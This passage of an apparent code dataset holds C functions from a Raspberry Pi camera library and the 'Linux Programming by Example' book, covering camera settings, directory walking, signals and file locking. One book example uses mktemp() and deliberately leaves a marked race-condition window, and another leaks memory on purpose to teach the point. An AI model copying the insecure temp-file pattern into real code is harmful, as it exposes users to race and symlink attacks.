  }\n\n   /* Ensure there are enough buffers to avoid dropping frames */\n   if (still_port->buffer_num < VIDEO_OUTPUT_BUFFERS_NUM)\n      still_port->buffer_num = VIDEO_OUTPUT_BUFFERS_NUM;\n\n   /* Enable component */\n   status = mmal_component_enable(camera);\n\n   if (status != MMAL_SUCCESS)\n   {\n      vcos_log_error(\"camera component couldn't be enabled\");\n      goto error;\n   }\n\n   \n\n   state->camera_component = camera;\n\n   \n\n   return status;\n\nerror:\n\n   if (camera)\n      mmal_component_destroy(camera);\n\n   return status;\n}", "path": "src\\picam.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Set the specified camera to all the specified settings\n * @param camera Pointer to camera component\n * @param params Pointer to parameter block containing parameters\n * @return 0 if successful, none-zero if unsuccessful.\n */\n", "func_signal": "int raspicamcontrol_set_all_parameters(MMAL_COMPONENT_T *camera, const RASPICAM_CAMERA_PARAMETERS *params)", "code": "{\n   int result;\n\n   result  = raspicamcontrol_set_saturation(camera, params->saturation);\n   result += raspicamcontrol_set_sharpness(camera, params->sharpness);\n   result += raspicamcontrol_set_contrast(camera, params->contrast);\n   result += raspicamcontrol_set_brightness(camera, params->brightness);\n   result += raspicamcontrol_set_ISO(camera, params->ISO);\n   result += raspicamcontrol_set_video_stabilisation(camera, params->videoStabilisation);\n   result += raspicamcontrol_set_exposure_compensation(camera, params->exposureCompensation);\n   result += raspicamcontrol_set_exposure_mode(camera, params->exposureMode);\n   result += raspicamcontrol_set_metering_mode(camera, params->exposureMeterMode);\n   result += raspicamcontrol_set_awb_mode(camera, params->awbMode);\n   result += raspicamcontrol_set_imageFX(camera, params->imageEffect);\n   result += raspicamcontrol_set_colourFX(camera, &params->colourEffects);\n   //result += raspicamcontrol_set_thumbnail_parameters(camera, &params->thumbnailConfig);  TODO Not working for some reason\n   result += raspicamcontrol_set_rotation(camera, params->rotation);\n   result += raspicamcontrol_set_flips(camera, params->hflip, params->vflip);   \n   result += raspicamcontrol_set_ROI(camera, params->roi);\n   result += raspicamcontrol_set_shutter_speed(camera, params->shutter_speed);   \n   return result;\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Function to take a mmal enum (as int) and return the string equivalent\n * @param en Incoming int to match\n * @param map Mapping data\n * @param num_refs The number of items in the mapping data\n * @return const pointer to string, or NULL if no match\n */\n", "func_signal": "static const char *unmap_xref(const int en, XREF_T *map, int num_refs)", "code": "{\n   int i;\n\n   for (i=0;i<num_refs;i++)\n   {\n      if (en == map[i].mmal_mode)\n      {\n         return map[i].mode;\n      }\n   }\n   return NULL;\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Set the sharpness of the image\n * @param camera Pointer to camera component\n * @param sharpness Sharpness adjustment -100 to 100\n */\n", "func_signal": "int raspicamcontrol_set_sharpness(MMAL_COMPONENT_T *camera, int sharpness)", "code": "{\n   int ret = 0;\n\n   if (!camera)\n      return 1;\n\n   if (sharpness >= -100 && sharpness <= 100)\n   {\n      MMAL_RATIONAL_T value = {sharpness, 100};\n      ret = mmal_status_to_int(mmal_port_parameter_set_rational(camera->control, MMAL_PARAMETER_SHARPNESS, value));\n   }\n   else\n   {\n      vcos_log_error(\"Invalid sharpness value\");\n      ret = 1;\n   }\n\n   return ret;\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Set the video stabilisation flag. Only used in video mode\n * @param camera Pointer to camera component\n * @param saturation Flag 0 off 1 on\n * @return 0 if successful, non-zero if any parameters out of range\n */\n", "func_signal": "int raspicamcontrol_set_video_stabilisation(MMAL_COMPONENT_T *camera, int vstabilisation)", "code": "{\n   if (!camera)\n      return 1;\n\n   return mmal_status_to_int(mmal_port_parameter_set_boolean(camera->control, MMAL_PARAMETER_VIDEO_STABILISATION, vstabilisation));\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Give the supplied parameter block a set of default values\n * @params Pointer to parameter block\n */\n", "func_signal": "void raspicamcontrol_set_defaults(RASPICAM_CAMERA_PARAMETERS *params)", "code": "{\n   vcos_assert(params);\n\n   params->sharpness = 0;\n   params->contrast = 0;\n   params->brightness = 50;\n   params->saturation = 0;\n   params->ISO = 0; // 0 = auto\n   params->videoStabilisation = 0;\n   params->exposureCompensation = 0;\n   params->exposureMode = MMAL_PARAM_EXPOSUREMODE_AUTO;\n   params->exposureMeterMode = MMAL_PARAM_EXPOSUREMETERINGMODE_AVERAGE;\n   params->awbMode = MMAL_PARAM_AWBMODE_AUTO;\n   params->imageEffect = MMAL_PARAM_IMAGEFX_NONE;\n   params->colourEffects.enable = 0;\n   params->colourEffects.u = 128;\n   params->colourEffects.v = 128;\n   params->rotation = 0;\n   params->hflip = params->vflip = 0;\n   params->roi.x = params->roi.y = 0.0;\n   params->roi.w = params->roi.h = 1.0;\n   params->shutter_speed = 0;          // 0 = auto\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n *  buffer header callback function for camera control\n *\n *  No actions taken in current version\n *\n * @param port Pointer to port from which callback originated\n * @param buffer mmal buffer header pointer\n */\n", "func_signal": "static void camera_control_callback(MMAL_PORT_T *port, MMAL_BUFFER_HEADER_T *buffer)", "code": "{\n   if (buffer->cmd == MMAL_EVENT_PARAMETER_CHANGED) {\n   } else {\n      vcos_log_error(\"Received unexpected camera control callback event, 0x%08x\", buffer->cmd);\n   }\n\n   mmal_buffer_header_release(buffer);\n}", "path": "src\\picam.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Adjust the exposure compensation for images (EV)\n * @param camera Pointer to camera component\n * @param exp_comp Value to adjust, -10 to +10\n * @return 0 if successful, non-zero if any parameters out of range\n */\n", "func_signal": "int raspicamcontrol_set_exposure_compensation(MMAL_COMPONENT_T *camera, int exp_comp)", "code": "{\n   if (!camera)\n      return 1;\n\n   return mmal_status_to_int(mmal_port_parameter_set_int32(camera->control, MMAL_PARAMETER_EXPOSURE_COMP , exp_comp));\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n * Adjust the metering mode for images\n * @param camera Pointer to camera component\n * @param saturation Value from following\n *   - MMAL_PARAM_EXPOSUREMETERINGMODE_AVERAGE,\n *   - MMAL_PARAM_EXPOSUREMETERINGMODE_SPOT,\n *   - MMAL_PARAM_EXPOSUREMETERINGMODE_BACKLIT,\n *   - MMAL_PARAM_EXPOSUREMETERINGMODE_MATRIX\n * @return 0 if successful, non-zero if any parameters out of range\n */\n", "func_signal": "int raspicamcontrol_set_metering_mode(MMAL_COMPONENT_T *camera, MMAL_PARAM_EXPOSUREMETERINGMODE_T m_mode )", "code": "{\n   MMAL_PARAMETER_EXPOSUREMETERINGMODE_T meter_mode = {{MMAL_PARAMETER_EXP_METERING_MODE,sizeof(meter_mode)},\n                                                      m_mode};\n   if (!camera)\n      return 1;\n\n   return mmal_status_to_int(mmal_port_parameter_set(camera->control, &meter_mode.hdr));\n}", "path": "src\\RaspiCamControl.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/**\n *  buffer header callback function for encoder\n *\n *  Callback will dump buffer data to the specific file\n *\n * @param port Pointer to port from which callback originated\n * @param buffer mmal buffer header pointer\n */\n", "func_signal": "static void encoder_buffer_callback(MMAL_PORT_T *port, MMAL_BUFFER_HEADER_T *buffer)", "code": "{\n   int complete = 0;\n\n   // We pass our file handle and other stuff in via the userdata field.\n\n   PORT_USERDATA *pData = (PORT_USERDATA *)port->userdata;\n   \n   if (pData) {\n        \n       RASPISTILL_STATE *state = pData->pstate;   \n       int bytes_written = buffer->length;\n       if (state->videoEncode == 1) {          \n           vcos_assert(pData->file_handle);\n           if (buffer->length) {\n               mmal_buffer_header_mem_lock(buffer);\n               bytes_written = fwrite(buffer->data, 1, buffer->length, pData->file_handle);\n               mmal_buffer_header_mem_unlock(buffer);\n           }\n           if (bytes_written != buffer->length) {\n               vcos_log_error(\"Failed to write buffer data (%d from %d)- aborting\", bytes_written, buffer->length);\n               pData->abort = 1;\n           }\n       } else {    \n          if (buffer->length) {\n              mmal_buffer_header_mem_lock(buffer);             \n              if ((state->bytesStored > 0) && (bytes_written > 0)) {\n                  long newLen = state->bytesStored + bytes_written;\n                  uint8_t *new_buffer = malloc(newLen);\n                  memcpy(new_buffer, state->filedata, state->bytesStored);\n                  memcpy(new_buffer + state->bytesStored, buffer->data, bytes_written);\n              \n                  free(state->filedata); //Free previous buffer\n              \n                  state->filedata = new_buffer;             \n                  state->bytesStored =  state->bytesStored + bytes_written;             \n              } else {\n                  state->filedata = malloc(bytes_written);\n                  memcpy(state->filedata, buffer->data, bytes_written);\n                  state->bytesStored = bytes_written;\n              }         \n              mmal_buffer_header_mem_unlock(buffer);                 \n          }\n       }\n       // Now flag if we have completed\n       if (buffer->flags & (MMAL_BUFFER_HEADER_FLAG_FRAME_END | MMAL_BUFFER_HEADER_FLAG_TRANSMISSION_FAILED))\n         complete = 1;\n   } else {\n      vcos_log_error(\"Received a encoder buffer callback with no state\");\n   }\n\n   // release buffer back to the pool\n   mmal_buffer_header_release(buffer);\n\n   // and send one back to the port (if still open)\n   if (port->is_enabled) {\n      MMAL_STATUS_T status = MMAL_SUCCESS;\n      MMAL_BUFFER_HEADER_T *new_buffer;\n\n      new_buffer = mmal_queue_get(pData->pstate->encoder_pool->queue);\n\n      if (new_buffer) {\n         status = mmal_port_send_buffer(port, new_buffer);\n      }\n      if (!new_buffer || status != MMAL_SUCCESS)\n         vcos_log_error(\"Unable to return a buffer to the encoder port\");\n   }\n\n   if (complete)\n      vcos_semaphore_post(&(pData->complete_semaphore));\n\n}", "path": "src\\picam.c", "repo_name": "ashtons/picam", "stars": 64, "license": "other", "language": "c", "size": 201}
{"docstring": "/* emp_name_id_compare --- compare by name, then by ID */\n", "func_signal": "int emp_name_id_compare(const void *e1p, const void *e2p)", "code": "{\n\tconst struct employee *e1, *e2;\n\tint last, first;\n\n\te1 = (const struct employee *) e1p;\n\te2 = (const struct employee *) e2p;\n\n\tif ((last = strcmp(e1->lastname, e2->lastname)) != 0)\n\t\treturn last;\n\n\t/* same last name, check first name */\n\tif ((first = strcmp(e1->firstname, e2->firstname)) != 0)\n\t\treturn first;\n\n\t/* same first name, check ID numbers */\n\tif (e1->emp_id < e2->emp_id)\n\t\treturn -1;\n\telse if (e1->emp_id == e2->emp_id)\n\t\treturn 0;\n\telse\n\t\treturn 1;\n\n}", "path": "book\\ch06\\ch06-sortemp.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* main --- leak memory with setjmp() and longjmp() */\n", "func_signal": "int main(void)", "code": "{\n\tchar *start_break;\n\tchar *current_break;\n\tptrdiff_t diff;\n\n\tstart_break = sbrk((ptrdiff_t) 0);\n\n\tif (setjmp(env) == 0)\t\t/* first time */\n\t\tprintf(\"setjmp called\\n\");\n\n\tcurrent_break = sbrk((ptrdiff_t) 0);\n\n\tdiff = current_break - start_break;\n\tprintf(\"memsize = %ld\\n\", (long) diff);\n\n\tf1();\n\n\treturn 0;\n}", "path": "book\\ch12\\ch12-memleak.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/*\n * process --- do something with the directory, in this case,\n *             print inode/name pairs on standard output.\n *             Return 0 if all OK, 1 otherwise.\n */\n", "func_signal": "int\nprocess(const char *dir)", "code": "{\n\tDIR *dp;\n\tstruct dirent **entries;\n\tint nents, i;\n\n\tnents = scandir(dir, & entries, nodots, alphasort);\n\tif (nents < 0) {\n\t\tfprintf(stderr, \"%s: scandir failed: %s\\n\", myname,\n\t\t\t\tstrerror(errno));\n\t\treturn 1;\n\t}\n\n\tfor (i = 0; i < nents; i++) {\n\t\tprintf(\"%8ld %s\\n\", entries[i]->d_ino, entries[i]->d_name);\n\t\tfree(entries[i]);\n\t}\n\n\tfree(entries);\n\n\treturn 0;\n}", "path": "book\\ch06\\ch06-sortdir.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* main --- call nftw() on each command-line argument */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n\tint i, c, nfds;\n\tint errors = 0;\n\tint flags = FTW_PHYS;\n\tchar start[PATH_MAX], finish[PATH_MAX];\n\n\twhile ((c = getopt(argc, argv, \"c\")) != -1) {\n\t\tswitch (c) {\n\t\tcase 'c':\n\t\t\tflags |= FTW_CHDIR;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tusage(argv[0]);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (optind == argc)\n\t\tusage(argv[0]);\n\n\tgetcwd(start, sizeof start);\n\n\tnfds = getdtablesize() - SPARE_FDS;\t/* leave some spare descriptors */\n\tfor (i = optind; i < argc; i++) {\n\t\tif (nftw(argv[i], process, nfds, flags) != 0) {\n\t\t\tfprintf(stderr, \"%s: %s: stopped early\\n\",\n\t\t\t\targv[0], argv[i]);\n\t\t\terrors++;\n\t\t}\n\t}\n\n\tif ((flags & FTW_CHDIR) != 0) {\n\t\tgetcwd(finish, sizeof finish);\n\t\tprintf(\"Starting dir: %s\\n\", start);\n\t\tprintf(\"Finishing dir: %s\\n\", finish);\n\t}\n\n\treturn (errors != 0);\n}", "path": "book\\ch08\\ch08-nftw.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* emp_seniority_compare --- compare by seniority */\n", "func_signal": "int emp_seniority_compare(const void *e1p, const void *e2p)", "code": "{\n\tconst struct employee *e1, *e2;\n\tdouble diff;\n\n\te1 = (const struct employee *) e1p;\n\te2 = (const struct employee *) e2p;\n\n\tdiff = difftime(e1->start_date, e2->start_date);\n\tif (diff < 0.0)\n\t\treturn -1;\n\telse if (diff > 0.0)\n\t\treturn 1;\n\telse\n\t\treturn 0;\n}", "path": "book\\ch06\\ch06-sortemp.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* os_is_setuid --- true if running setuid root */\n", "func_signal": "int\nos_is_setuid()", "code": "{\n\tlong uid, euid;\n\n\tuid = getuid();\n\teuid = geteuid();\n\n\treturn (euid == 0 && euid != uid);\n}", "path": "gnu\\gawk-3.1.3\\posix\\gawkmisc.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* Print N_BYTES.  Convert it to a readable value before printing.  */\n", "func_signal": "static void\nprint_only_size (uintmax_t n_bytes)", "code": "{\n  char buf[LONGEST_HUMAN_READABLE + 1];\n  fputs (human_readable (n_bytes, buf, human_output_opts,\n\t\t\t 1, output_block_size), stdout);\n}", "path": "gnu\\coreutils-5.0\\src\\du.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* handler --- simple signal handler. */\n", "func_signal": "void handler(int signum)", "code": "{\n\tchar buf[200], *cp;\n\tint offset;\n\n\t/* Jump through hoops to avoid fprintf(). */\n\tstrcpy(buf, \"handler: caught signal \");\n\tcp = buf + strlen(buf);\t/* cp points at terminating '\\0' */\n\tif (signum > 100)\t/* unlikely */\n\t\toffset = 3;\n\telse if (signum > 10)\n\t\toffset = 2;\n\telse\n\t\toffset = 1;\n\tcp += offset;\n\n\t*cp-- = '\\0';\t\t/* terminate string */\n\twhile (signum > 0) {\t/* work backwards, filling in digits */\n\t\t*cp-- = (signum % 10) + '0';\n\t\tsignum /= 10;\n\t}\n\tstrcat(buf, \"\\n\");\n\t(void) write(2, buf, strlen(buf));\n}", "path": "book\\ch10\\ch10-catchint.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* main --- print N different die faces */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n\tint nfaces;\n\tint i, j, k;\n\n\tif (argc != 2) {\n\t\tfprintf(stderr, \"usage: %s number-die-faces\\n\", argv[0]);\n\t\texit(1);\n\t}\n\n\tnfaces = atoi(argv[1]);\n\n\tif (nfaces <= 0) {\n\t\tfprintf(stderr, \"usage: %s number-die-faces\\n\", argv[0]);\n\t\tfprintf(stderr, \"\\tUse a positive number!\\n\");\n\t\texit(1);\n\t}\n\n\tfor (i = 1; i <= nfaces; i++) {\n\t\tj = myrandom() % 6;\t\t/* force to range 0 <= j <= 5 */\n\t\tprintf(\"+-------+\\n\");\n\t\tfor (k = 0; k < 3; k++)\n\t\t\tprintf(\"|%s|\\n\", die_faces[(j * 3) + k]);\n\t\tprintf(\"+-------+\\n\");\n\t\tputchar('\\n');\n\t}\n\n\treturn 0;\n}", "path": "book\\ch12\\ch12-devrandom.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* for PATH_MAX */\n", "func_signal": "int main(void)", "code": "{\n\tstatic char template[] = \"/tmp/myfileXXXXXX\";\n\tchar fname[PATH_MAX];\n\tstatic char mesg[] =\n\t\t\"Here's lookin' at you, kid!\\n\";\t/* beats \"hello, world\" */\n\tint fd;\n\n\tstrcpy(fname, template);\n\tmktemp(fname);\n\n\t/* RACE CONDITION WINDOW OPENS */\n\n\tprintf(\"Filename is %s\\n\", fname);\n\n\t/* RACE CONDITION WINDOW LASTS TO HERE */\n\n\tfd = open(fname, O_CREAT|O_RDWR|O_TRUNC, 0600);\n\twrite(fd, mesg, strlen(mesg));\n\tclose(fd);\n\n\t/* unlink(fname); */\n\n\treturn 0;\n}", "path": "book\\ch12\\ch12-mktemp.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* Compare two dev/ino pairs.  Return true if they are the same.  */\n", "func_signal": "static bool\nentry_compare (void const *x, void const *y)", "code": "{\n  struct entry const *a = x;\n  struct entry const *b = y;\n  return SAME_INODE (*a, *b) ? true : false;\n}", "path": "gnu\\coreutils-5.0\\src\\du.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* main --- set up signal handling and go into infinite loop */\n", "func_signal": "int main(void)", "code": "{\n\t(void) signal(SIGINT, handler);\n\n\tfor (;;)\n\t\tpause();\t/* wait for a signal, see later in the chapter */\n\n\treturn 0;\n}", "path": "book\\ch10\\ch10-catchint.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* main --- loop over directory arguments */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n\tint i;\n\tint errs = 0;\n\n\tmyname = argv[0];\n\n\tif (argc == 1)\n\t\terrs = process(\".\");\t/* default to current directory */\n\telse\n\t\tfor (i = 1; i < argc; i++)\n\t\t\terrs += process(argv[i]);\n\n\treturn (errs != 0);\n}", "path": "book\\ch06\\ch06-sortdir.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* This function is called once for every file system object that nftw\n   encounters.  nftw does a depth-first traversal.  This function knows\n   that and accumulates per-directory totals based on changes in\n   the depth of the current entry.  */\n", "func_signal": "static int\nprocess_file (const char *file, const struct stat *sb, int file_type,\n\t      struct FTW *info)", "code": "{\n  uintmax_t size;\n  uintmax_t size_to_print;\n  static int first_call = 1;\n  static size_t prev_level;\n  static size_t n_alloc;\n  static uintmax_t *sum_ent;\n  static uintmax_t *sum_subdir;\n  int print = 1;\n\n  /* Always define info->skip before returning.  */\n  info->skip = excluded_filename (exclude, file + info->base);\n\n  switch (file_type)\n    {\n    case FTW_NS:\n      error (0, errno, _(\"cannot access %s\"), quote (file));\n      G_fail = 1;\n      return 0;\n\n    case FTW_DCHP:\n      error (0, errno, _(\"cannot change to parent of directory %s\"),\n\t     quote (file));\n      G_fail = 1;\n      return 0;\n\n    case FTW_DCH:\n      /* Don't return just yet, since although nftw couldn't chdir into the\n\t directory, it was able to stat it, so we do have a size.  */\n      error (0, errno, _(\"cannot change to directory %s\"), quote (file));\n      G_fail = 1;\n      break;\n\n    case FTW_DNR:\n      /* Don't return just yet, since although nftw couldn't read the\n\t directory, it was able to stat it, so we do have a size.  */\n      error (0, errno, _(\"cannot read directory %s\"), quote (file));\n      G_fail = 1;\n      break;\n\n    default:\n      break;\n    }\n\n  /* If this is the first (pre-order) encounter with a directory,\n     return right away.  */\n  if (file_type == FTW_DPRE)\n    return 0;\n\n  /* If the file is being excluded or if it has already been counted\n     via a hard link, then don't let it contribute to the sums.  */\n  if (info->skip\n      || (!opt_count_all\n\t  && 1 < sb->st_nlink\n\t  && hash_ins (sb->st_ino, sb->st_dev)))\n    {\n      /* Note that we must not simply return here.\n\t We still have to update prev_level and maybe propagate\n\t some sums up the hierarchy.  */\n      size = 0;\n      print = 0;\n    }\n  else\n    {\n      size = (apparent_size\n\t      ? sb->st_size\n\t      : ST_NBLOCKS (*sb) * ST_NBLOCKSIZE);\n    }\n\n  if (first_call)\n    {\n      n_alloc = info->level + 10;\n      sum_ent = XCALLOC (uintmax_t, n_alloc);\n      sum_subdir = XCALLOC (uintmax_t, n_alloc);\n    }\n  else\n    {\n      /* FIXME: it's a shame that we need these `size_t' casts to avoid\n\t warnings from gcc about `comparison between signed and unsigned'.\n\t Probably unavoidable, assuming that the members of struct FTW\n\t are of type `int' (historical), since I want variables like\n\t n_alloc and prev_level to have types that make sense.  */\n      if (n_alloc <= (size_t) info->level)\n\t{\n\t  n_alloc = info->level * 2;\n\t  sum_ent = XREALLOC (sum_ent, uintmax_t, n_alloc);\n\t  sum_subdir = XREALLOC (sum_subdir, uintmax_t, n_alloc);\n\t}\n    }\n\n  size_to_print = size;\n\n  if (! first_call)\n    {\n      if ((size_t) info->level == prev_level)\n\t{\n\t  /* This is usually the most common case.  Do nothing.  */\n\t}\n      else if ((size_t) info->level > prev_level)\n\t{\n\t  /* Descending the hierarchy.\n\t     Clear the accumulators for *all* levels between prev_level\n\t     and the current one.  The depth may change dramatically,\n\t     e.g., from 1 to 10.  */\n\t  int i;\n\t  for (i = prev_level + 1; i <= info->level; i++)\n\t    sum_ent[i] = sum_subdir[i] = 0;\n\t}\n      else /* info->level < prev_level */\n\t{\n\t  /* Ascending the hierarchy.\n\t     nftw processes a directory only after all entries in that\n\t     directory have been processed.  When the depth decreases,\n\t     propagate sums from the children (prev_level) to the parent.\n\t     Here, the current level is always one smaller than the\n\t     previous one.  */\n\t  assert ((size_t) info->level == prev_level - 1);\n\t  size_to_print += sum_ent[prev_level];\n\t  if (!opt_separate_dirs)\n\t    size_to_print += sum_subdir[prev_level];\n\t  sum_subdir[info->level] += (sum_ent[prev_level]\n\t\t\t\t      + sum_subdir[prev_level]);\n\t}\n    }\n\n  prev_level = info->level;\n  first_call = 0;\n\n  /* Let the size of a directory entry contribute to the total for the\n     containing directory, unless --separate-dirs (-S) is specified.  */\n  if ( ! (opt_separate_dirs && IS_FTW_DIR_TYPE (file_type)))\n    sum_ent[info->level] += size;\n\n  /* Even if this directory is unreadable or we can't chdir into it,\n     do let its size contribute to the total, ... */\n  tot_size += size;\n\n  /* ... but don't print out a total for it, since without the size(s)\n     of any potential entries, it could be very misleading.  */\n  if (file_type == FTW_DNR || file_type == FTW_DCH)\n    return 0;\n\n  /* If we're not counting an entry, e.g., because it's a hard link\n     to a file we've already counted (and --count-links), then don't\n     print a line for it.  */\n  if (!print)\n    return 0;\n\n  /* FIXME: This looks suspiciously like it could be simplified.  */\n  if ((IS_FTW_DIR_TYPE (file_type) &&\n\t\t     (info->level <= max_depth || info->level == 0))\n      || ((opt_all && info->level <= max_depth) || info->level == 0))\n    {\n      print_only_size (size_to_print);\n      fputc ('\\t', stdout);\n      if (arg_length)\n\t{\n\t  /* Print the file name, but without the `.' or `/.'\n\t     directory suffix that we may have added in main.  */\n\t  /* Print everything before the part we appended.  */\n\t  fwrite (file, arg_length, 1, stdout);\n\t  /* Print everything after what we appended.  */\n\t  fputs (file + arg_length + suffix_length\n\t\t + (file[arg_length + suffix_length] == '/'), stdout);\n\t}\n      else\n\t{\n\t  fputs (file, stdout);\n\t}\n      fputc ('\\n', stdout);\n      fflush (stdout);\n    }\n\n  return 0;\n}", "path": "gnu\\coreutils-5.0\\src\\du.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* f2 --- allocate some memory, make longjmp */\n", "func_signal": "void f2(void)", "code": "{\n\tchar *p = malloc(1024);\n\n\tlongjmp(env, 1);\n}", "path": "book\\ch12\\ch12-memleak.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* for mode_t */\n", "func_signal": "int\nmain(int argc, char **argv)", "code": "{\n\tint fd;\n\tint i, j;\n\tmode_t rw_mode;\n\tstatic char message[] = \"hello, world\\n\";\n\tstruct flock lock;\n\n\tif (argc != 2) {\n\t\tfprintf(stderr, \"usage: %s file\\n\", argv[0]);\n\t\texit(1);\n\t}\n\t\n\trw_mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH;                /* 0644 */\n\tfd = open(argv[1], O_RDWR|O_TRUNC|O_CREAT|O_EXCL, rw_mode);\n\tif (fd < 0) {\n\t\tfprintf(stderr, \"%s: %s: cannot open for read/write: %s\\n\",\n\t\t\t\targv[0], argv[1], strerror(errno));\n\t\t(void) close(fd);\n\t\treturn 1;\n\t}\n\n\tif (write(fd, message, strlen(message)) != strlen(message)) {\n\t\tfprintf(stderr, \"%s: %s: cannot write: %s\\n\",\n\t\t\t\targv[0], argv[1], strerror(errno));\n\t\t(void) close(fd);\n\t\treturn 1;\n\t}\n\n\trw_mode |= S_ISGID;\t/* add mandatory lock bit */\n\n\tif (fchmod(fd, rw_mode) < 0) {\n\t\tfprintf(stderr, \"%s: %s: cannot change mode to %o: %s\\n\",\n\t\t\t\targv[0], argv[1], rw_mode, strerror(errno));\n\t\t(void) close(fd);\n\t\treturn 1;\n\t}\n\n\t/* lock the file */\n\tmemset(& lock, '\\0', sizeof(lock));\n\tlock.l_whence = SEEK_SET;\n\tlock.l_start = 0;\n\tlock.l_len = 0;\t\t\t/* whole-file lock */\n\tlock.l_type = F_WRLCK;\t\t/* write lock */\n\n\tif (fcntl(fd, F_SETLK, & lock) < 0) {\n\t\tfprintf(stderr, \"%s: %s: cannot lock the file: %s\\n\",\n\t\t\t\targv[0], argv[1], strerror(errno));\n\t\t(void) close(fd);\n\t\treturn 1;\n\t}\n\n\tpause();\n\n\t(void) close(fd);\n\n\treturn 0;\n}", "path": "book\\ch14\\ch14-lockall.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* Try to insert the INO/DEV pair into the global table, HTAB.\n   If the pair is successfully inserted, return zero.\n   Upon failed memory allocation exit nonzero.\n   If the pair is already in the table, return nonzero.  */\n", "func_signal": "static int\nhash_ins (ino_t ino, dev_t dev)", "code": "{\n  struct entry *ent;\n  struct entry *ent_from_table;\n\n  ent = (struct entry *) xmalloc (sizeof *ent);\n  ent->st_ino = ino;\n  ent->st_dev = dev;\n\n  ent_from_table = hash_insert (htab, ent);\n  if (ent_from_table == NULL)\n    {\n      /* Insertion failed due to lack of memory.  */\n      xalloc_die ();\n    }\n\n  if (ent_from_table == ent)\n    {\n      /* Insertion succeeded.  */\n      return 0;\n    }\n\n  /* That pair is already in the table, so ENT was not inserted.  Free it.  */\n  free (ent);\n\n  return 1;\n}", "path": "gnu\\coreutils-5.0\\src\\du.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* Initialize the hash table.  */\n", "func_signal": "static void\nhash_init (void)", "code": "{\n  htab = hash_initialize (INITIAL_TABLE_SIZE, NULL,\n\t\t\t  entry_hash, entry_compare, free);\n  if (htab == NULL)\n    xalloc_die ();\n}", "path": "gnu\\coreutils-5.0\\src\\du.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* process --- print out each file at the right level */\n", "func_signal": "int process(const char *file, const struct stat *sb,\n\t    int flag, struct FTW *s)", "code": "{\n\tint retval = 0;\n\tconst char *name = file + s->base;\n\n\tprintf(\"%*s\", s->level * 4, \"\");\t/* indent over */\n\n\tswitch (flag) {\n\tcase FTW_F:\n\t\tprintf(\"%s (file)\\n\", name);\n\t\tbreak;\n\tcase FTW_D:\n\t\tprintf(\"%s (directory)\\n\", name);\n\t\tbreak;\n\tcase FTW_DNR:\n\t\tprintf(\"%s (unreadable directory)\\n\", name);\n\t\tbreak;\n\tcase FTW_SL:\n\t\tprintf(\"%s (symbolic link)\\n\", name);\n\t\tbreak;\n\tcase FTW_NS:\n\t\tprintf(\"%s (stat failed): %s\\n\", name, strerror(errno));\n\t\tbreak;\n\tcase FTW_DP:\n\tcase FTW_SLN:\n\t\tprintf(\"%s: FTW_DP or FTW_SLN: can't happen!\\n\", name);\n\t\tretval = 1;\n\t\tbreak;\n\tdefault:\n\t\tprintf(\"%s: unknown flag %d: can't happen!\\n\", name, flag);\n\t\tretval = 1;\n\t\tbreak;\n\t}\n\n\treturn retval;\n}", "path": "book\\ch08\\ch08-nftw.c", "repo_name": 